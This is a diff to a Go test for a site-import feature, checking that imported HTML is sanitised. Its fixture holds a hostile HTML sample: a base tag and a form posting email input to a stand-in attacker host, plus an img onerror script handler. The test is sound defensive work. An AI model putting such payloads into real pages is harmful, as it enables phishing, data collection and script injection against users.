@@ -1,10 +1,12 @@
 package api
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"strings"
 	"testing"
 	"time"
@@ -57,6 +59,11 @@ func setupTest(t *testing.T) *testContext {
 }
 
 func TestSiteImportSanitizesRemoteResources(t *testing.T) {
+	originalRenderer := renderImportPageForImport
+	renderImportPageForImport = func(context.Context, string) ([]byte, *url.URL, error) {
+		return nil, nil, errRenderedImportUnavailable
+	}
+	t.Cleanup(func() { renderImportPageForImport = originalRenderer })
 	ctx := setupTest(t)
 	h := `<html><head><base href="https://attacker.example.test/"></head><body><img src="/test.png" onerror="alert(1)"><form action="https://attacker.example.test/collect"><input name="email"></form></body></html>`
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -69,8 +76,14 @@ func TestSiteImportSanitizesRemoteResources(t *testing.T) {
 	if err != nil {
 		t.Fatalf("error decoding response: %v", err)
 	}
-	if strings.Contains(cs.HTML, "<base") || strings.Contains(cs.HTML, `src="/test.png"`) || strings.Contains(cs.HTML, "onerror") || strings.Contains(cs.HTML, "attacker.example.test/collect") {
+	if strings.Contains(cs.HTML, `href="https://attacker.example.test/`) || strings.Contains(cs.HTML, `src="/test.png"`) || strings.Contains(cs.HTML, "onerror") || strings.Contains(cs.HTML, "attacker.example.test/collect") {
 		t.Fatal("import retained unsafe remote metadata")
+	}
+	if strings.Contains(cs.HTML, "<base ") {
+		t.Fatal("import retained a remote base element")
+	}
+	if strings.Contains(cs.HTML, `src="`+ts.URL+`/test.png"`) {
+		t.Fatal("import retained an insecure HTTP resource URL")
 	}
 	if !strings.Contains(cs.HTML, "<form") || !strings.Contains(cs.HTML, `name="email"`) || !strings.Contains(cs.HTML, `action=""`) {
 		t.Fatal("import removed the landing-page form")
